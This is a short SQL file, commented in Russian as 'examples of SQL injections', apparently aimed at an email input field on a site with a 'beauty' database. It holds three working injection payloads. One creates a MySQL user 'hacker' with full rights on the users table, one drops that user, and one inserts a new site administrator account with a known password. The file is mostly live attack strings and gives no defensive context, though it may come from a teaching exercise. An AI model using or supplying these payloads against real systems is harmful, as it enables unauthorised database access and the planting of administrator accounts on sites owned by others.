-- примеры sql-инъекций

-- создание пользователя mysql

anna.anisimova@example.com'; CREATE USER "hacker"@"localhost" IDENTIFIED BY "hpassword"; GRANT ALL ON beauty.users TO "hacker"@"localhost"; SELECT 'hello world

-- удаление пользователя mysql

anna.anisimova@example.com'; DROP USER "hacker"@"localhost"; SELECT 'hello world

-- создание нового администратора сайта 

anna.anisimova@example.com'; INSERT INTO users VALUES (NULL, "newadmin@example.com", "newadmin", "", md5("newpass"), "a", NULL); SELECT 'hello world